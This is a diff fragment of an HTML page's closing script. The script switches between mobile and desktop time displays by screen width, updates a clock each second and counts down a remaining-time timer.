+        if (window.innerWidth < 768) {
+            document.getElementById('mobileTime').style.display = 'flex';
+            document.getElementById('headerTime').style.display = 'none';
+        } else {
+            document.getElementById('mobileTime').style.display = 'none';
+            document.getElementById('headerTime').style.display = 'flex';
+        }
+
+        // Update timers
+        setInterval(updateTime, 1000);
+        setInterval(() => {
+            if (timeRemaining > 0) {
+                timeRemaining--;
+            }
+            updateTimer();
+        }, 1000);
+
+        // Responsive behavior
+        window.addEventListener('resize', () => {
+            if (window.innerWidth < 768) {
+                document.getElementById('mobileTime').style.display = 'flex';
+                document.getElementById('headerTime').style.display = 'none';
+            } else {
+                document.getElementById('mobileTime').style.display = 'none';
+                document.getElementById('headerTime').style.display = 'flex';
+            }
+        });
+    </script>
+</body>
+</html>
